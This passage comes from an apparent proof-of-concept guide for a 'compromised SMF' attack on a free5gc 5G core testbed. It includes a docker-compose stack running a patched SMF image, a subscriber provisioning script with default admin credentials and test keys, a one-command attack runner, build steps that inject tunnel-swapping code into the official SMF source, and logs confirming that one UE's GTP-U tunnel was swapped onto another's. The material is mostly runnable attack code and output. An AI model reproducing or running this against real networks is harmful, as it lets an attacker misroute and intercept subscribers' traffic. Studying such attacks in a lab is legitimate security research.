      - ./attack_poc/config/upf2cfg.yaml:/free5gc/config/upfcfg.yaml
      - ./config/upf-iptables.sh:/free5gc/upf-iptables.sh
    cap_add:
      - NET_ADMIN
      - SYS_ADMIN
    devices:
      - /dev/net/tun:/dev/net/tun
    privileged: true
    networks:
      privnet:
        ipv4_address: 10.100.200.102
        aliases:
          - upf2.free5gc.org

  # ──────────────────────────── MongoDB ────────────────────────────
  db:
    container_name: mongodb
    image: mongo:4.4
    command: mongod --port 27017
    expose:
      - "27017"
    volumes:
      - dbdata:/data/db
    networks:
      privnet:
        aliases:
          - db

  # ──────────────────────────── NRF ────────────────────────────
  free5gc-nrf:
    container_name: nrf
    image: free5gc/nrf:v4.1.0
    command: ./nrf -c ./config/nrfcfg.yaml
    expose:
      - "8000"
    volumes:
      - ./config/nrfcfg.yaml:/free5gc/config/nrfcfg.yaml
      - ./cert:/free5gc/cert
    environment:
      DB_URI: mongodb://db/free5gc
      GIN_MODE: release
    networks:
      privnet:
        aliases:
          - nrf.free5gc.org
    depends_on:
      - db

  # ──────────────────────────── AMF ────────────────────────────
  free5gc-amf:
    container_name: amf
    image: free5gc/amf:v4.1.0
    command: ./amf -c ./config/amfcfg.yaml
    expose:
      - "8000"
    volumes:
      - ./config/amfcfg.yaml:/free5gc/config/amfcfg.yaml
      - ./cert:/free5gc/cert
    environment:
      GIN_MODE: release
    networks:
      privnet:
        ipv4_address: 10.100.200.16
        aliases:
          - amf.free5gc.org
    depends_on:
      - free5gc-nrf

  # ──────────────────────────── AUSF ────────────────────────────
  free5gc-ausf:
    container_name: ausf
    image: free5gc/ausf:v4.1.0
    command: ./ausf -c ./config/ausfcfg.yaml
    expose:
      - "8000"
    volumes:
      - ./config/ausfcfg.yaml:/free5gc/config/ausfcfg.yaml
      - ./cert:/free5gc/cert
    environment:
      GIN_MODE: release
    networks:
      privnet:
        aliases:
          - ausf.free5gc.org
    depends_on:
      - free5gc-nrf

  # ──────────────────────────── NSSF ────────────────────────────
  free5gc-nssf:
    container_name: nssf
    image: free5gc/nssf:v4.1.0
    command: ./nssf -c ./config/nssfcfg.yaml
    expose:
      - "8000"
    volumes:
      - ./config/nssfcfg.yaml:/free5gc/config/nssfcfg.yaml
      - ./cert:/free5gc/cert
    environment:
      GIN_MODE: release
    networks:
      privnet:
        aliases:
          - nssf.free5gc.org
    depends_on:
      - free5gc-nrf

  # ──────────────────────────── PCF ────────────────────────────
  free5gc-pcf:
    container_name: pcf
    image: free5gc/pcf:v4.1.0
    command: ./pcf -c ./config/pcfcfg.yaml
    expose:
      - "8000"
    volumes:
      - ./config/pcfcfg.yaml:/free5gc/config/pcfcfg.yaml
      - ./cert:/free5gc/cert
    environment:
      GIN_MODE: release
    networks:
      privnet:
        aliases:
          - pcf.free5gc.org
    depends_on:
      - free5gc-nrf

  # ──────────────── COMPROMISED SMF ────────────────
  free5gc-smf:
    container_name: smf
    image: free5gc/smf:compromised
    command: ./smf -c ./config/smfcfg.yaml -u ./config/uerouting.yaml
    expose:
      - "8000"
    volumes:
      - ./attack_poc/config/smfcfg-attack.yaml:/free5gc/config/smfcfg.yaml
      - ./attack_poc/config/uerouting-attack.yaml:/free5gc/config/uerouting.yaml
      - ./cert:/free5gc/cert
    environment:
      GIN_MODE: release
    networks:
      privnet:
        aliases:
          - smf.free5gc.org
    depends_on:
      - free5gc-nrf
      - free5gc-upf1
      - free5gc-upf2

  # ──────────────────────────── UDM ────────────────────────────
  free5gc-udm:
    container_name: udm
    image: free5gc/udm:v4.1.0
    command: ./udm -c ./config/udmcfg.yaml
    expose:
      - "8000"
    volumes:
      - ./config/udmcfg.yaml:/free5gc/config/udmcfg.yaml
      - ./cert:/free5gc/cert
    environment:
      GIN_MODE: release
    networks:
      privnet:
        aliases:
          - udm.free5gc.org
    depends_on:
      - db
      - free5gc-nrf

  # ──────────────────────────── UDR ────────────────────────────
  free5gc-udr:
    container_name: udr
    image: free5gc/udr:v4.1.0
    command: ./udr -c ./config/udrcfg.yaml
    expose:
      - "8000"
    volumes:
      - ./config/udrcfg.yaml:/free5gc/config/udrcfg.yaml
      - ./cert:/free5gc/cert
    environment:
      DB_URI: mongodb://db/free5gc
      GIN_MODE: release
    networks:
      privnet:
        aliases:
          - udr.free5gc.org
    depends_on:
      - db
      - free5gc-nrf

  # ──────────────────────────── CHF ────────────────────────────
  free5gc-chf:
    container_name: chf
    image: free5gc/chf:v4.1.0
    command: ./chf -c ./config/chfcfg.yaml
    expose:
      - "8000"
    volumes:
      - ./config/chfcfg.yaml:/free5gc/config/chfcfg.yaml
      - ./cert:/free5gc/cert
    environment:
      DB_URI: mongodb://db/free5gc
      GIN_MODE: release
    networks:
      privnet:
        aliases:
          - chf.free5gc.org
    depends_on:
      - db
      - free5gc-nrf

  # ──────────────────────────── WebUI ────────────────────────────
  free5gc-webui:
    container_name: webui
    image: free5gc/webui:v4.1.0
    command: ./webui -c ./config/webuicfg.yaml
    expose:
      - "2121"
    volumes:
      - ./config/webuicfg.yaml:/free5gc/config/webuicfg.yaml
    environment:
      - GIN_MODE=release
    networks:
      privnet:
        aliases:
          - webui
    ports:
      - "5050:5000"
      - "2123:2122"
      - "2124:2121"
    depends_on:
      - db
      - free5gc-nrf

  # ──────────────────────────── gNB ────────────────────────────
  ueransim-gnb:
    container_name: ueransim-gnb
    image: free5gc/ueransim:latest
    command: ./nr-gnb -c ./config/gnbcfg.yaml
    volumes:
      - ./attack_poc/config/gnbcfg.yaml:/ueransim/config/gnbcfg.yaml
      - ./attack_poc/captures:/ueransim/captures
    cap_add:
      - NET_ADMIN
    devices:
      - "/dev/net/tun"
    networks:
      privnet:
        aliases:
          - gnb.free5gc.org
    depends_on:
      - free5gc-amf
      - free5gc-upf1
      - free5gc-upf2

  # ──────────────────────────── UE1 ────────────────────────────
  ueransim-ue1:
    container_name: ueransim-ue1
    image: free5gc/ueransim:latest
    command: ./nr-ue -c ./config/uecfg.yaml
    volumes:
      - ./attack_poc/config/ue1cfg.yaml:/ueransim/config/uecfg.yaml
    cap_add:
      - NET_ADMIN
    devices:
      - "/dev/net/tun"
    networks:
      privnet:
        aliases:
          - ue1.free5gc.org
    depends_on:
      - ueransim-gnb

  # ──────────────────────────── UE2 ────────────────────────────
  ueransim-ue2:
    container_name: ueransim-ue2
    image: free5gc/ueransim:latest
    command: ./nr-ue -c ./config/uecfg.yaml
    volumes:
      - ./attack_poc/config/ue2cfg.yaml:/ueransim/config/uecfg.yaml
    cap_add:
      - NET_ADMIN
    devices:
      - "/dev/net/tun"
    networks:
      privnet:
        aliases:
          - ue2.free5gc.org
    depends_on:
      - ueransim-gnb

networks:
  privnet:
    ipam:
      driver: default
      config:
        - subnet: 10.100.200.0/24
    driver_opts:
      com.docker.network.bridge.name: br-free5gc

volumes:
  dbdata:
```

### 5h. Provisioning Script -- provision_subscribers.sh

This script registers UE1 and UE2 in the free5gc database via the WebUI REST API. It uses JWT authentication.

```bash
#!/bin/bash
# ============================================================================
# provision_subscribers.sh — Register UE1 and UE2 via free5gc WebUI REST API
# ============================================================================
set -euo pipefail

WEBUI_URL="${WEBUI_URL:-http://localhost:5050}"
PLMN="20893"
KEY="8baf473f2f8fd09487cccbd7097c6862"
OPC="8e27b6af0e692e750f32667a3b14605d"
SQN="000000000020"
AMF="8000"

echo "[*] Provisioning UE1 and UE2 via WebUI API at ${WEBUI_URL}..."

# ─── Login to get JWT token ────────────────────────────────────────────────
echo "[*] Logging in to WebUI..."
login_resp=$(curl -s -X POST "${WEBUI_URL}/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"free5gc"}')

TOKEN=$(echo "$login_resp" | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])" 2>/dev/null)

if [ -z "$TOKEN" ]; then
  echo "FATAL: Failed to get JWT token from WebUI. Response: $login_resp"
  exit 1
fi
echo "    JWT token obtained."

# ─── Delete existing subscribers (ignore errors) ──────────────────────────
curl -s -o /dev/null -X DELETE "${WEBUI_URL}/api/subscriber/imsi-208930000000001/${PLMN}" \
  -H "Content-Type: application/json" -H "Token: ${TOKEN}" || true
curl -s -o /dev/null -X DELETE "${WEBUI_URL}/api/subscriber/imsi-208930000000002/${PLMN}" \
  -H "Content-Type: application/json" -H "Token: ${TOKEN}" || true
sleep 1

# ─── Subscriber payload ───────────────────────────────────────────────────
sub_create() {
  local ue_id="$1"
  local msisdn="$2"
  cat << EOF
{
  "plmnID": "${PLMN}",
  "ueId": "${ue_id}",
  "AuthenticationSubscription": {
    "authenticationManagementField": "${AMF}",
    "authenticationMethod": "5G_AKA",
    "milenage": {
      "op": { "encryptionAlgorithm": 0, "encryptionKey": 0, "opValue": "" }
    },
    "opc": {
      "encryptionAlgorithm": 0, "encryptionKey": 0,
      "opcValue": "${OPC}"
    },
    "permanentKey": {
      "encryptionAlgorithm": 0, "encryptionKey": 0,
      "permanentKeyValue": "${KEY}"
    },
    "sequenceNumber": "${SQN}"
  },
  "AccessAndMobilitySubscriptionData": {
    "gpsis": [ "msisdn-${msisdn}" ],
    "nssai": {
      "defaultSingleNssais": [
        { "sst": 1, "sd": "010203", "isDefault": true },
        { "sst": 1, "sd": "112233", "isDefault": true }
      ],
      "singleNssais": []
    },
    "subscribedUeAmbr": { "downlink": "2 Gbps", "uplink": "1 Gbps" }
  },
  "SessionManagementSubscriptionData": [
    {
      "singleNssai": { "sst": 1, "sd": "010203" },
      "dnnConfigurations": {
        "internet": {
          "sscModes": { "defaultSscMode": "SSC_MODE_1", "allowedSscModes": [ "SSC_MODE_2", "SSC_MODE_3" ] },
          "pduSessionTypes": { "defaultSessionType": "IPV4", "allowedSessionTypes": [ "IPV4" ] },
          "sessionAmbr": { "uplink": "200 Mbps", "downlink": "100 Mbps" },
          "5gQosProfile": { "5qi": 9, "arp": { "priorityLevel": 8 }, "priorityLevel": 8 }
        }
      }
    },
    {
      "singleNssai": { "sst": 1, "sd": "112233" },
      "dnnConfigurations": {
        "internet": {
          "sscModes": { "defaultSscMode": "SSC_MODE_1", "allowedSscModes": [ "SSC_MODE_2", "SSC_MODE_3" ] },
          "pduSessionTypes": { "defaultSessionType": "IPV4", "allowedSessionTypes": [ "IPV4" ] },
          "sessionAmbr": { "uplink": "200 Mbps", "downlink": "100 Mbps" },
          "5gQosProfile": { "5qi": 9, "arp": { "priorityLevel": 8 }, "priorityLevel": 8 }
        }
      }
    }
  ],
  "SmfSelectionSubscriptionData": {
    "subscribedSnssaiInfos": {
      "01010203": { "dnnInfos": [ { "dnn": "internet" } ] },
      "01112233": { "dnnInfos": [ { "dnn": "internet" } ] }
    }
  },
  "AmPolicyData": { "subscCats": [ "free5gc" ] },
  "SmPolicyData": {
    "smPolicySnssaiData": {
      "01010203": {
        "snssai": { "sst": 1, "sd": "010203" },
        "smPolicyDnnData": { "internet": { "dnn": "internet" } }
      },
      "01112233": {
        "snssai": { "sst": 1, "sd": "112233" },
        "smPolicyDnnData": { "internet": { "dnn": "internet" } }
      }
    }
  }
}
EOF
}

# ─── Create UE1 ───────────────────────────────────────────────────────────
resp=$(curl -s -w "\n%{http_code}" -X POST "${WEBUI_URL}/api/subscriber/imsi-208930000000001/${PLMN}" \
  -H "Content-Type: application/json" -H "Token: ${TOKEN}" \
  -d "$(sub_create "imsi-208930000000001" "0900000001")")
code=$(echo "$resp" | tail -n1)
if [ "$code" = "201" ] || [ "$code" = "200" ]; then
  echo "[OK] UE1 (imsi-208930000000001) provisioned — S-NSSAI SST=1 SD=010203"
else
  echo "FATAL: UE1 provision failed (HTTP $code). Response: $(echo "$resp" | head -n -1)"
  exit 1
fi

# ─── Create UE2 ───────────────────────────────────────────────────────────
resp=$(curl -s -w "\n%{http_code}" -X POST "${WEBUI_URL}/api/subscriber/imsi-208930000000002/${PLMN}" \
  -H "Content-Type: application/json" -H "Token: ${TOKEN}" \
  -d "$(sub_create "imsi-208930000000002" "0900000002")")
code=$(echo "$resp" | tail -n1)
if [ "$code" = "201" ] || [ "$code" = "200" ]; then
  echo "[OK] UE2 (imsi-208930000000002) provisioned — S-NSSAI SST=1 SD=112233"
else
  echo "FATAL: UE2 provision failed (HTTP $code). Response: $(echo "$resp" | head -n -1)"
  exit 1
fi

echo ""
echo "[OK] Both subscribers provisioned successfully."
```

### 5i. Run Script -- run_attack_from_scratch.sh

This is the one-command orchestration script that executes the entire attack end-to-end.

```bash
#!/bin/bash
# ============================================================================
# run_attack_from_scratch.sh — Run Compromised SMF attack + generate pcap proof
# ============================================================================
# Usage (from free5gc-compose repo root):
#   ./attack_poc/run_attack_from_scratch.sh
# ============================================================================
set -euo pipefail

REPO_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
cd "${REPO_ROOT}"

CAPTURE_DIR="${REPO_ROOT}/attack_poc/captures"
mkdir -p "${CAPTURE_DIR}"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
PCAP_FILE="${CAPTURE_DIR}/attack_proof_${TIMESTAMP}.pcap"
PROOF_REPORT="${CAPTURE_DIR}/attack_proof_report_${TIMESTAMP}.txt"

COMPOSE_CMD="docker compose -f attack_poc/docker-compose-attack.yaml --project-name attack_poc --project-directory ."
WEBUI_URL="http://localhost:5050"

echo "=============================================="
echo " Compromised SMF Attack — Full Run"
echo "=============================================="

# ─── 1. Tear down + wipe DB volume ──────────────────────────────────────────
echo "[1/8] Tearing down existing stack and wiping DB volume..."
${COMPOSE_CMD} down --volumes --remove-orphans 2>/dev/null || true
sleep 3

# ─── 2. Bring up the full stack ─────────────────────────────────────────────
echo "[2/8] Bringing up attack stack..."
${COMPOSE_CMD} up -d
echo "    Waiting 20s for NFs to initialize..."
sleep 20

# ─── 3. Wait for WebUI to accept login ─────────────────────────────────────
echo "[3/8] Waiting for WebUI login to become available..."
for i in $(seq 1 20); do
  login_resp=$(curl -s -X POST "${WEBUI_URL}/api/login" \
    -H "Content-Type: application/json" \
    -d '{"username":"admin","password":"free5gc"}' 2>/dev/null || echo "")
  if echo "$login_resp" | python3 -c "import sys,json; t=json.load(sys.stdin)['access_token']; assert len(t)>10" 2>/dev/null; then
    echo "    WebUI ready (login OK)."
    break
  fi
  if [ "$i" -eq 20 ]; then
    echo "FATAL: WebUI not ready after 60s. Aborting."
    ${COMPOSE_CMD} logs webui 2>&1 | tail -20
    exit 1
  fi
  sleep 3
done

# ─── 4. Provision subscribers ───────────────────────────────────────────────
echo "[4/8] Provisioning UE1 and UE2..."
export WEBUI_URL
bash "${REPO_ROOT}/attack_poc/provision_subscribers.sh"
sleep 3

# ─── 5. Restart gNB + UEs sequentially (UE1 first, then UE2) ───────────────
echo "[5/8] Restarting gNB + UEs (UE1 first, then UE2 for attack order)..."
${COMPOSE_CMD} stop ueransim-ue1 ueransim-ue2 2>/dev/null || true
${COMPOSE_CMD} restart ueransim-gnb
sleep 5

echo "    Starting UE1..."
${COMPOSE_CMD} start ueransim-ue1
echo "    Waiting 20s for UE1 registration + PDU session..."
sleep 20

# Check UE1 got a tunnel
if docker exec ueransim-ue1 ip addr show uesimtun0 &>/dev/null; then
  echo "    UE1 uesimtun0 is UP."
else
  echo "    WARNING: UE1 uesimtun0 not found. Checking logs..."
  docker logs ueransim-ue1 2>&1 | tail -10
  echo "    Waiting 15s more..."
  sleep 15
fi

echo "    Starting UE2..."
${COMPOSE_CMD} start ueransim-ue2
echo "    Waiting 20s for UE2 registration + PDU session..."
sleep 20

if docker exec ueransim-ue2 ip addr show uesimtun0 &>/dev/null; then
  echo "    UE2 uesimtun0 is UP."
else
  echo "    WARNING: UE2 uesimtun0 not found. Checking logs..."
  docker logs ueransim-ue2 2>&1 | tail -10
  echo "    Waiting 15s more..."
  sleep 15
fi

# ─── 6. Capture N3 GTP-U traffic via gNB container ─────────────────────────
echo "[6/8] Capturing N3 GTP-U traffic..."

echo "    Installing tcpdump in gNB container..."
docker exec ueransim-gnb apt-get update -qq 2>/dev/null
docker exec ueransim-gnb apt-get install -y -qq tcpdump 2>/dev/null

PCAP_CONTAINER="/ueransim/captures/attack_proof_${TIMESTAMP}.pcap"
docker exec -d ueransim-gnb timeout 40 tcpdump -i any -w "${PCAP_CONTAINER}" 'udp port 2152'
sleep 2

echo "    Generating uplink traffic from UE1..."
docker exec ueransim-ue1 ping -I uesimtun0 -c 10 -W 2 8.8.8.8 2>/dev/null || true
echo "    Generating uplink traffic from UE2..."
docker exec ueransim-ue2 ping -I uesimtun0 -c 10 -W 2 8.8.8.8 2>/dev/null || true
echo "    Waiting for pcap flush..."
sleep 5
docker exec ueransim-gnb killall tcpdump 2>/dev/null || true
sleep 2

# ─── 7. Generate proof report ──────────────────────────────────────────────
echo "[7/8] Gathering attack proof..."

{
  echo "=============================================="
  echo " ATTACK PROOF REPORT — ${TIMESTAMP}"
  echo "=============================================="
  echo ""
  echo "--- SMF [ATTACK] log lines ---"
  docker logs smf 2>&1 | grep -iE "ATTACK|SWAP|Session 1|Session 2" || echo "(no attack log lines)"
  echo ""
  echo "--- PFCP associations (SMF <-> UPFs) ---"
  docker logs smf 2>&1 | grep -E "UPF\(10\.100\.200\.(101|102)\)|association" | tail -5
  echo ""
  echo "--- Pcap: ${PCAP_FILE} ---"
  if [ -s "${PCAP_FILE}" ]; then
    echo "Size: $(stat -c%s "${PCAP_FILE}") bytes"
    PKTS=$(docker exec ueransim-gnb tcpdump -r "${PCAP_CONTAINER}" -n 2>/dev/null | wc -l || echo 0)
    echo "GTP-U packets: ${PKTS}"
    echo ""
    echo "--- Sample GTP-U packets ---"
    docker exec ueransim-gnb tcpdump -r "${PCAP_CONTAINER}" -n -v 2>/dev/null | head -40
  else
    echo "Pcap is empty — PDU sessions may not have established."
  fi
  echo ""
  echo "--- GTP-U traffic destination analysis ---"
  TO_UPF1=$(docker exec ueransim-gnb tcpdump -r "${PCAP_CONTAINER}" -n 2>/dev/null | grep -c "10.100.200.101" || echo 0)
  TO_UPF2=$(docker exec ueransim-gnb tcpdump -r "${PCAP_CONTAINER}" -n 2>/dev/null | grep -c "10.100.200.102" || echo 0)
  echo "  Packets involving UPF1 (10.100.200.101): ${TO_UPF1}"
  echo "  Packets involving UPF2 (10.100.200.102): ${TO_UPF2}"
  if [ "${TO_UPF2}" = "0" ] && [ "${TO_UPF1}" -gt 0 ]; then
    echo "  >>> ATTACK CONFIRMED: ALL GTP-U traffic goes to UPF1 only!"
    echo "  >>> UE2 traffic was swapped from UPF2 to UPF1."
  fi
  echo ""
  echo "--- UPF IP reference ---"
  echo "  UPF1 N3: 10.100.200.101 (S-NSSAI 1/010203)"
  echo "  UPF2 N3: 10.100.200.102 (S-NSSAI 1/112233)"
  echo ""
  echo "--- Expected attack result ---"
  echo "  Without attack: UE1 UL -> UPF1 (10.100.200.101), UE2 UL -> UPF2 (10.100.200.102)"
  echo "  With attack:    UE1 UL -> UPF2 (10.100.200.102), UE2 UL -> UPF1 (10.100.200.101)"
  echo ""
  echo "--- UE PDU session status ---"
  echo "UE1:"
  docker exec ueransim-ue1 ip addr show uesimtun0 2>/dev/null || echo "  (no uesimtun0)"
  echo "UE2:"
  docker exec ueransim-ue2 ip addr show uesimtun0 2>/dev/null || echo "  (no uesimtun0)"
} | tee "${PROOF_REPORT}"

echo ""
echo "[8/8] Done."
echo "=============================================="
echo " Pcap:   ${PCAP_FILE}"
echo " Report: ${PROOF_REPORT}"
echo " Open pcap in Wireshark — filter: gtp"
echo " Check ip.dst and gtp.teid to verify swap."
echo "=============================================="
```

---

## 6. Building the Compromised SMF Image

### 6.1 Build Steps

From the `free5gc-compose` repository root:

```bash
cd attack_poc
chmod +x build_compromised_smf.sh
./build_compromised_smf.sh
```

### 6.2 What the Build Does

1. **Clones** the official `free5gc/smf` repo (main branch, shallow clone) into `smf-build/smf/`.
2. **Copies** `tunnel_swap.go` into `smf/internal/context/` -- this adds the `AttackState` global and `RecordAndSwap()` function.
3. **Patches** `ngap_build.go` via a Python script that finds the UL NG-U UP TNL Information block and injects the `AttackState.RecordAndSwap()` call.
4. **Builds** a multi-stage Docker image:
   - **Stage 1 (builder)**: `golang:1.25-bookworm` -- compiles the Go source with attack code into a static binary.
   - **Stage 2 (runtime)**: `alpine:3.19` -- minimal image with just the binary, bash, curl, and tcpdump.

### 6.3 Expected Output

```
============================================
 Building Compromised SMF Docker Image
============================================
[*] Cloning free5gc/smf (main branch)...
[*] Injecting tunnel_swap.go into smf/internal/context/...
[*] Patching ngap_build.go...
  [OK] Patched UL NG-U UP TNL Information block
  [OK] ngap_build.go patched successfully
[*] Creating Dockerfile...
[*] Building Docker image: free5gc/smf:compromised...
...
 SUCCESS: free5gc/smf:compromised built
============================================
```

Verify the image exists:

```bash
docker images | grep "smf.*compromised"
```

---

## 7. Running the Attack

### 7.1 One-Command Execution

From the `free5gc-compose` repository root:

```bash
chmod +x attack_poc/run_attack_from_scratch.sh
./attack_poc/run_attack_from_scratch.sh
```

### 7.2 What Each Step Does

| Step | Description | Duration |
|------|-------------|----------|
| 1/8 | Tear down any existing stack and wipe MongoDB volume to ensure clean state | ~3s |
| 2/8 | Bring up all 16 containers (UPFs, core NFs, gNB, UEs) | ~20s |
| 3/8 | Poll WebUI login endpoint until JWT authentication succeeds | ~10-30s |
| 4/8 | Provision UE1 and UE2 subscriber profiles via WebUI REST API | ~3s |
| 5/8 | Stop UEs, restart gNB, start UE1 (wait for registration), start UE2 (wait for registration) | ~60s |
| 6/8 | Install tcpdump in gNB container, capture GTP-U traffic while UE1 and UE2 send ICMP pings | ~30s |
| 7/8 | Parse pcap and logs to generate a proof report | ~5s |
| 8/8 | Print pcap and report file paths | instant |

**Total runtime: approximately 2-3 minutes.**

### 7.3 Why UE1 Must Register Before UE2

The attack requires UE1's session to be the **first** one recorded by `RecordAndSwap()`. If UE2 registers first, UE2's tunnel info is recorded as "session 1" and UE1 gets the swapped info instead. The script ensures ordering by starting UE1 first, waiting for it to fully register, then starting UE2.

---

## 8. Verifying the Attack -- Real Proof

This section contains **real logs and pcap data** from an actual successful attack run on 2026-03-04. When you replicate the setup, your timestamps and TEIDs may differ, but the structure and pattern will be identical. Use this as your reference for what to look for.

### 8a. SMF Attack Logs

Run `docker logs smf 2>&1 | grep -iE "ATTACK|SWAP|PFCP"` and look for these exact patterns.

**PFCP associations -- both UPFs must connect:**

```
[INFO][SMF][PFCP] Listen on 10.100.200.6:8805
[INFO][SMF][Main] Sending PFCP Association Request to UPF[upf1.free5gc.org](10.100.200.101)
[INFO][SMF][Main] Sending PFCP Association Request to UPF[upf2.free5gc.org](10.100.200.102)
[INFO][SMF][Main] Received PFCP Association Setup Accepted Response from UPF[upf1.free5gc.org](10.100.200.101)
[INFO][SMF][Main] Received PFCP Association Setup Accepted Response from UPF[upf2.free5gc.org](10.100.200.102)
[INFO][SMF][Main] UPF(10.100.200.101) setup association
[INFO][SMF][Main] UPF(10.100.200.102) setup association
```

If you do not see BOTH UPFs, the SMF config is wrong. Check `smfcfg-attack.yaml` has both `UPF1` and `UPF2` in `upNodes`.

**Session 1 (UE1) -- recorded at 08:28:43:**

```
[INFO][SMF][PduSess][pdu_session_id:1][supi:imsi-208930000000001] S-NSSAI[sst: 1, sd: 010203] DNN[internet]
[INFO][SMF][PduSess][pdu_session_id:1][supi:imsi-208930000000001] Allocated PDUAdress[10.60.0.1]
[INFO][SMF][PduSess] Sending PFCP Session Establishment Request
[INFO][SMF][PduSess] Received PFCP Session Establishment Accepted Response
[ATTACK] Recording session 1: SUPI=imsi-208930000000001, TEID=0x00000002, UPF_IP=10.100.200.101
[ATTACK] Session 1 recorded. Waiting for session 2 before swap.
[ATTACK] Session 1 ORIGINAL: TEID=0x00000002, UPF_IP=10.100.200.101 (SUPI=imsi-208930000000001)
```

Key values to note:
- **TEID=0x00000002**: The GTP-U tunnel endpoint ID allocated by UPF1 for UE1's session.
- **UPF_IP=10.100.200.101**: UPF1's N3 interface IP.
- UE1's session passes through with its original (correct) tunnel info.

**Session 2 (UE2) -- SWAP EXECUTED at 08:29:03:**

```
[INFO][SMF][PduSess][pdu_session_id:1][supi:imsi-208930000000002] S-NSSAI[sst: 1, sd: 112233] DNN[internet]
[INFO][SMF][PduSess][pdu_session_id:1][supi:imsi-208930000000002] Allocated PDUAdress[10.61.0.1]
[INFO][SMF][PduSess] Sending PFCP Session Establishment Request
[INFO][SMF][PduSess] Received PFCP Session Establishment Accepted Response
[ATTACK] Recording session 2: SUPI=imsi-208930000000002, TEID=0x00000006, UPF_IP=10.100.200.102
========================================
[ATTACK] *** SWAP EXECUTED ***
[ATTACK] Session 2 (SUPI=imsi-208930000000002) gets Session 1's tunnel:
[ATTACK]   TEID=0x00000006 → 0x00000002
[ATTACK]   UPF_IP=10.100.200.102 → 10.100.200.101
[ATTACK] Session 1 (SUPI=imsi-208930000000001) was sent ORIGINAL (will be swapped on next N2 build if triggered)
========================================
```

Key values:
- UE2 **should** get `TEID=0x00000006, UPF_IP=10.100.200.102` (UPF2).
- Instead, the swap sends `TEID=0x00000002, UPF_IP=10.100.200.101` (UPF1's tunnel from UE1's session).
- The `*** SWAP EXECUTED ***` banner confirms the attack fired.

### 8b. AMF Logs

Run `docker logs amf 2>&1 | grep -iE "N1N2|PDUSession|imsi-20893"`.

**UE1 (imsi-208930000000001) -- successful registration and session:**

```
[INFO][AMF][Gmm] MobileIdentity5GS: SUCI[suci-0-208-93-0000-0-0-0000000001]
[INFO][AMF][Gmm][supi:SUPI:imsi-208930000000001] Send Registration Accept
[INFO][AMF][Gmm][supi:SUPI:imsi-208930000000001] Handle Registration Complete
[INFO][AMF][Gmm][supi:SUPI:imsi-208930000000001] Select SMF [snssai: {Sst:1 Sd:010203}, dnn: internet]
[INFO][AMF][Gmm][supi:SUPI:imsi-208930000000001] create smContext[pduSessionID: 1] Success
[INFO][AMF][Producer] Handle N1N2 Message Transfer Request
[INFO][AMF][Ngap] Handle PDUSessionResourceSetupResponse (RAN UE NGAP ID: 1)
```

**UE2 (imsi-208930000000002) -- successful registration and session (AMF is unaware of swap):**

```
[INFO][AMF][Gmm] MobileIdentity5GS: SUCI[suci-0-208-93-0000-0-0-0000000002]
[INFO][AMF][Gmm][supi:SUPI:imsi-208930000000002] Send Registration Accept
[INFO][AMF][Gmm][supi:SUPI:imsi-208930000000002] Handle Registration Complete
[INFO][AMF][Gmm][supi:SUPI:imsi-208930000000002] Select SMF [snssai: {Sst:1 Sd:112233}, dnn: internet]
[INFO][AMF][Gmm][supi:SUPI:imsi-208930000000002] create smContext[pduSessionID: 1] Success
[INFO][AMF][Producer] Handle N1N2 Message Transfer Request
[INFO][AMF][Ngap] Handle PDUSessionResourceSetupResponse (RAN UE NGAP ID: 2)
```

The AMF sees both as normal N1N2 transfers and PDUSessionResourceSetup successes. It has **no mechanism** to detect that the SMF sent wrong tunnel info for UE2.

### 8c. UE1 Logs -- Successful Registration

Run `docker logs ueransim-ue1 2>&1`. Look for the **second** startup (after gNB restart). The successful portion:

```
UERANSIM v3.2.7
[2026-03-04 08:28:41.701] [nas] [info] UE switches to state [MM-DEREGISTERED/PLMN-SEARCH]
[2026-03-04 08:28:41.703] [nas] [info] Selected plmn[208/93]
[2026-03-04 08:28:41.703] [rrc] [info] Selected cell plmn[208/93] tac[1] category[SUITABLE]
[2026-03-04 08:28:41.703] [nas] [info] UE switches to state [MM-DEREGISTERED/NORMAL-SERVICE]
[2026-03-04 08:28:41.704] [nas] [info] UE switches to state [MM-REGISTER-INITIATED]
[2026-03-04 08:28:41.705] [rrc] [info] RRC connection established
[2026-03-04 08:28:41.705] [rrc] [info] UE switches to state [RRC-CONNECTED]
[2026-03-04 08:28:41.705] [nas] [info] UE switches to state [CM-CONNECTED]
[2026-03-04 08:28:41.789] [nas] [debug] Authentication Request received
[2026-03-04 08:28:41.789] [nas] [debug] Received SQN [000000000020]
[2026-03-04 08:28:41.789] [nas] [debug] SQN-MS [000000000000]
[2026-03-04 08:28:41.908] [nas] [debug] Security Mode Command received
[2026-03-04 08:28:41.908] [nas] [debug] Selected integrity[2] ciphering[2]
[2026-03-04 08:28:42.275] [nas] [debug] Registration accept received
[2026-03-04 08:28:42.275] [nas] [info] UE switches to state [MM-REGISTERED/NORMAL-SERVICE]
[2026-03-04 08:28:42.275] [nas] [info] Initial Registration is successful
[2026-03-04 08:28:42.275] [nas] [debug] Sending PDU Session Establishment Request
[2026-03-04 08:28:43.856] [nas] [debug] PDU Session Establishment Accept received
[2026-03-04 08:28:43.856] [nas] [info] PDU Session establishment is successful PSI[1]
[2026-03-04 08:28:43.886] [app] [info] Connection setup for PDU session[1] is successful, TUN interface[uesimtun0, 10.60.0.1] is up.
```

Key indicators of success:
- `Received SQN [000000000020]` and `SQN-MS [000000000000]` -- SQN accepted (no re-sync needed).
- `Initial Registration is successful` -- UE1 is registered.
- `PDU Session establishment is successful PSI[1]` -- Data session is up.
- `TUN interface[uesimtun0, 10.60.0.1] is up` -- UE1 got an IP from UPF1's pool (10.60.0.0/16).

### 8d. UE2 Logs -- Also Successful (UE2 Sees Nothing Wrong)

Run `docker logs ueransim-ue2 2>&1`. The successful portion:

```
UERANSIM v3.2.7
[2026-03-04 08:29:02.723] [nas] [info] UE switches to state [MM-DEREGISTERED/PLMN-SEARCH]
[2026-03-04 08:29:02.725] [nas] [info] Selected plmn[208/93]
[2026-03-04 08:29:02.725] [rrc] [info] Selected cell plmn[208/93] tac[1] category[SUITABLE]
[2026-03-04 08:29:02.725] [nas] [info] UE switches to state [MM-DEREGISTERED/NORMAL-SERVICE]
[2026-03-04 08:29:02.725] [nas] [info] UE switches to state [MM-REGISTER-INITIATED]
[2026-03-04 08:29:02.725] [rrc] [info] RRC connection established
[2026-03-04 08:29:02.725] [rrc] [info] UE switches to state [RRC-CONNECTED]
